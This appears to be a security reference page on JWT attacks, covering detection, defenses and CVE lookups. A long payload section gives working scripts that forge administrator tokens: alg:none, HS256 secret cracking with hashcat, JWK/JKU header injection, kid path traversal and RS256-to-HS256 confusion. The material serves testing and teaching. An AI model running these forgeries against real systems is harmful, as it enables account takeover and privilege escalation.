# JWT Attacks

> Flaws in JWT signing/verification let attackers forge or tamper with tokens. **Deep dive:** [`Troubleshooting_Guide/jwt.md`](../../../../Troubleshooting_Guide/jwt.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** JSON Web Token · A07:2021
**Status:** complete

## What it is
JWT attacks exploit flaws in how a server signs or verifies JSON Web Tokens, letting an attacker
forge or tamper with the token's claims. Because JWTs carry identity and authorization data
(`sub`, `role`, `admin`) and the server trusts them, a verification flaw becomes account
takeover or privilege escalation.

## How it works
A JWT is `header.payload.signature` in Base64URL; the signature is meant to bind the header and
payload to a secret or key only the server holds. The attacker controls the whole token, so any
gap in verification is exploitable: a server that decodes but never checks the signature, accepts
`"alg":"none"`, uses a guessable HS256 secret, or trusts attacker-supplied key material in the
`jwk`/`jku`/`kid` headers. The classic algorithm-confusion bug treats a published RSA *public*
key as an HMAC secret, so the attacker re-signs with HS256 using that public key.

## Impact
Authentication bypass and privilege escalation — typically full account takeover, including
administrative accounts, by forging a token with elevated claims. Severity is high to critical,
since the token is the proof of identity for the whole session and often for every protected API.

## How to detect
- Tampering with the payload (e.g. changing `sub`) and reattaching the old signature still
  authenticates — signature is not verified.
- A token with `"alg":"none"` and no signature is accepted.
- Header fields like `jku`, `jwk`, `x5u`, or `kid` are present and influence verification
  (e.g. `kid` looks like a file path, `jku` points to a fetched URL).
- A published key set at `/jwks.json` or `/.well-known/jwks.json`, combined with a loose algorithm
  allow-list, hints at RS256→HS256 confusion.
- Short or default HS256 secrets crack quickly offline with hashcat mode 16500.

## Exploitation (summary)
Decode the token, identify the weakness from the header, then forge. With no verification, edit
claims and keep the original signature; with `alg:none`, drop the signature. Crack a weak HS256
secret and re-sign, or abuse `jwk`/`jku`/`kid` to make the server verify against attacker key
material. For algorithm confusion, sign HS256 with the public RSA key. Full payloads and scripts
are in the Payloads section below.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

A JWT is three Base64URL segments — `header.payload.signature`. Decode each before tampering:

```bash
echo "HEADER_B64" | base64 -d
echo "PAYLOAD_B64" | base64 -d
```

### Technique selection by header / weakness

| Situation | Technique |
|-----------|-----------|
| Signature never verified | Edit `sub`, reuse original signature |
| `alg: none` accepted | Drop signature entirely |
| Weak HS256 secret | Crack offline, re-sign |
| `jwk` header trusted | Embed attacker public key |
| `jku` header trusted | Host attacker JWK Set (SSRF) |
| `kid` used as file path | Point to known-content file, sign with it |
| Public RSA key exposed, alg allowlist loose | RS256 → HS256 confusion |
| No public key available | Derive it from two tokens (sig2n) |

Header parameters worth probing: `alg` (none / confusion), `kid` (path traversal, SQLi), `jku` (SSRF), `jwk` (embedded key), `x5u`/`x5c` (X.509 URL / embedded cert).

### Unverified signature
The server decodes but never verifies. Change the `sub` claim and reattach the original signature.

```python
import base64, json

token = "HEADER.PAYLOAD.SIGNATURE"
h, payload_b64, s = token.split(".")

payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
payload["sub"] = "administrator"

new_payload = base64.urlsafe_b64encode(
    json.dumps(payload, separators=(',', ':')).encode()
).rstrip(b'=').decode()

print(f"{h}.{new_payload}.{s}")
```

### Algorithm "none"
The server accepts `"alg": "none"` and skips verification. The trailing dot is required.

```python
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "administrator", "exp": 9999999999}
forged = f"{b64url(json.dumps(header, separators=(',',':')))}.{b64url(json.dumps(payload, separators=(',',':')))}."
print(forged)
```

### Weak HS256 secret
Crack the symmetric secret offline, then forge any payload with it.

```bash
hashcat -a 0 -m 16500 "JWT_TOKEN" jwt.secrets.list       # mode 16500 = JWT/HS256
hashcat -m 16500 jwt.txt wordlist.txt --show              # show cracked result
python3 jwt_tool.py <JWT> -C -d jwt.secrets.list
```

```python
import hmac, hashlib, base64

token = open('JWT-3.txt').read().strip()
header, payload, sig_b64 = token.split('.')
message = f"{header}.{payload}".encode()

with open('jwt.secrets.list') as f:
    for line in f:
        secret = line.strip()
        if hmac.new(secret.encode(), message, hashlib.sha256).digest() == base64.urlsafe_b64decode(sig_b64 + '=='):
            print(f"Found: {secret}")
            break
```

```python
import jwt
print(jwt.encode({"sub": "administrator", "exp": 9999999999}, "secret1", algorithm="HS256"))
```

### JWK header injection
Embed an attacker-generated public key in the `jwk` header; a misconfigured server verifies against it.

```python
from cryptography.hazmat.primitives.asymmetric import rsa
import base64, json

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = private_key.public_key().numbers()

def int_b64(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l, 'big')).rstrip(b'=').decode()

attacker_jwk = {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "attacker-key",
                "n": int_b64(pub.n), "e": int_b64(pub.e)}
header = {"alg": "RS256", "typ": "JWT", "kid": "attacker-key", "jwk": attacker_jwk}
payload = {"sub": "administrator", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = private_key.sign(f"{h}.{p}".encode(), None, None)
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

### JKU header injection
The server fetches the verification key from the `jku` URL. Host your own JWK Set (an SSRF-style trust abuse).

```python
# Step 1 — generate key pair and write the JWK Set
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

pk = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub_nums = pk.public_key().public_numbers()

def ib64(n):
    l = (n.bit_length() + 7) // 8
    return base64.urlsafe_b64encode(n.to_bytes(l, 'big')).rstrip(b'=').decode()

jwks = {"keys": [{"kty":"RSA","use":"sig","alg":"RS256","kid":"attacker","n":ib64(pub_nums.n),"e":ib64(pub_nums.e)}]}
with open("attacker-jwks.json","w") as f: json.dump(jwks, f)
pem = pk.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())
with open("attacker.pem","wb") as f: f.write(pem)
```

```python
# Step 2 — forge a token pointing at the hosted set
import jwt
from cryptography.hazmat.primitives import serialization
with open("attacker.pem","rb") as f:
    pk = serialization.load_pem_private_key(f.read(), None)
header = {"alg": "RS256", "typ": "JWT", "kid": "attacker", "jku": "https://YOUR-SERVER/attacker-jwks.json"}
print(jwt.encode({"sub": "administrator", "exp": 9999999999}, pk, algorithm="RS256", headers=header))
```

Serve it with `python3 -m http.server 8080`.

### KID path traversal
When `kid` is used as a file path, point it at a file with known/predictable contents and sign with that value.

```python
import hmac, hashlib, base64, json

NULL_KEY = b'\x00'
header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"}
payload = {"sub": "administrator", "exp": 9999999999}

h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = hmac.new(NULL_KEY, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

Predictable-content targets: `/dev/null` (`\x00`), `/proc/sys/kernel/randomize_va_space` (`"2\n"`), `/etc/hostname` (server hostname).

### Algorithm confusion (RS256 → HS256)
If the server validates the algorithm from the header, switch RS256 to HS256 and use the *public* RSA key as the HMAC secret.

```python
import requests, base64, json, hmac, hashlib
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization

TARGET = "https://TARGET.web-security-academy.net"
jwk = requests.get(f"{TARGET}/jwks.json").json()['keys'][0]

def b64d(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + '=' * (-len(s) % 4)), 'big')

pub_key = RSAPublicNumbers(b64d(jwk['e']), b64d(jwk['n'])).public_key(None)
pem = pub_key.public_bytes(serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "administrator", "exp": 9999999999}
h = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
sig = hmac.new(pem, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{s}")
```

When no public key is published, derive it from two valid tokens:

```bash
JWT1="eyJ...SIG1"; JWT2="eyJ...SIG2"
docker run --rm -it portswigger/sig2n "$JWT1" "$JWT2"
# test each candidate PEM as the HS256 secret
```

### Vulnerable code patterns & key endpoints
Sinks to recognize during review:

```python
jwt.decode(token, options={"verify_signature": False})        # alg:none / no verify
jwt.decode(token, secret, algorithms=["HS256", "RS256"])      # attacker picks alg
jwt.decode(token, public_key_pem, algorithms=[alg])           # public key as HMAC secret
key = open(f"/keys/{kid}", 'rb').read()                        # kid as file path
jwt.decode(token, secret)                                      # no exp/alg pinning
```

Key-publishing endpoints to probe:

```text
/jwks.json
/.well-known/jwks.json
/.well-known/openid-configuration
/auth/keys
/api/keys
```

## Defenses
1. **Always verify the signature** server-side and reject any unsigned token — never accept
   `"alg":"none"`.
2. **Pin the algorithm** explicitly to the one you expect (e.g. RS256 only); never let the
   token's header choose, which kills algorithm confusion.
3. **Strong keys** — use long, random HS256 secrets (or asymmetric keys) that resist offline
   cracking; rotate them.
4. **Distrust header-supplied key material** — ignore or strictly allow-list `jwk`, `jku`,
   `kid`, `x5u`, `x5c`; resolve keys only from a trusted, server-side source.
5. **Validate claims** — enforce `exp`, `iss`, and `aud`, and keep token lifetimes short with
   server-side revocation where needed.
6. **Use a maintained JWT library** with secure defaults rather than hand-rolling verification.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=JWT+Attacks
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=JWT+Attacks
- **Exploit-DB** — https://www.exploit-db.com/search?q=JWT+Attacks
- **GitHub Advisories** — https://github.com/advisories?query=JWT+Attacks
- **OSV** — https://osv.dev/list?q=JWT+Attacks
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `JWT Attacks <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2015-9235` — node-jsonwebtoken algorithm-confusion (RS256→HS256) verification bypass.
- `CVE-2022-23529` — node-jsonwebtoken insecure key handling leading to verification flaws.
- `CVE-2020-28042` — ServiceStack JWT signature-verification bypass.

## References
- PortSwigger Web Security Academy — JWT attacks.
- OWASP — JSON Web Token for Java / JWT Security Cheat Sheet.
- RFC 7519 — JSON Web Token (JWT); RFC 8725 — JWT Best Current Practices.
